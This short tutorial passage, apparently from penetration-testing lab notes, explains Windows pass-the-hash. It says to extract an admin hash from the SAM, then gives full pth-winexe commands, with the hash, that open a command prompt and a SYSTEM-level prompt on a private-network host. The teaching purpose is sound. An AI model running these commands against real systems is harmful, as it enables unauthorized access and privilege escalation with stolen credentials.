Windows accepts hashes instead of passwords to
authenticate to a number of services.

We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin userâ€™s hash.

1.Extract the admin hash from the SAM in the previous step.

2.Use the hash with pth-winexe to spawn a command prompt:

pth-winexe -U
'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c
4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe


3.Use the hash with pth-winexe to spawn a SYSTEM level command prompt:


 pth-winexe --system -U
'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c
4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
